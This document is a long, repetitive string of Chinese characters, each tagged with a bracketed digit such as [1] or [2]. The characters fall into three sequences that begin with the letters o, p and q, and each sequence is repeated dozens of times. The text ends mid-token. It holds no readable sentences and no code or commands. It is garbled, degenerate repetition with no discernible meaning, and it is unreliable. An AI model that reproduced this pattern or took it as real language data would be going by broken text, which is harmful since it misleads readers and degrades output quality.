[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2]o成[2]同[1]子[2]后[1]理[1]合[1]各[1]向[1]提[2]运[2]名[1]听[1]含[1]营[1]球[1]落[1]材[2]源[2]某[2]吃[1]吸[1]限[2]否[1]坐[2]析[2]盐[2]逐[2]搞[1]吧[1]吗[1]渐[2]乐[2]耐[2]齐[2] p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2]p可[1]发[1]经[2]小[2]量[2]反[1]又[1]变[1]只[1]意[2]提[1]式[2]及[1]取[1]口[1]受[1]每[2]叫[1]史[1]号[1]族[2]住[2]参[1]随[2]苏[2]台[1]另[1]减[2]叶[1]司[1]右[1]坏[2]古[1]双[1]协[2]友[1]菜[1]序[2]班[1]句[1]握[1]福[2]奏[2] q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2]环[1]控[1]获[1]掌[1]乎[2]厚[1]掉[1]措[1]玉[1]探[1]q后[2]现[1]从[2]去[1]与[2]明[2]原[1]接[1]压[1]济[2]美[2]风[2]华[2]低[2]历[1]率[1]王[1]厂[1]县[1]推[1]李[2]排[1]怎[2]城[2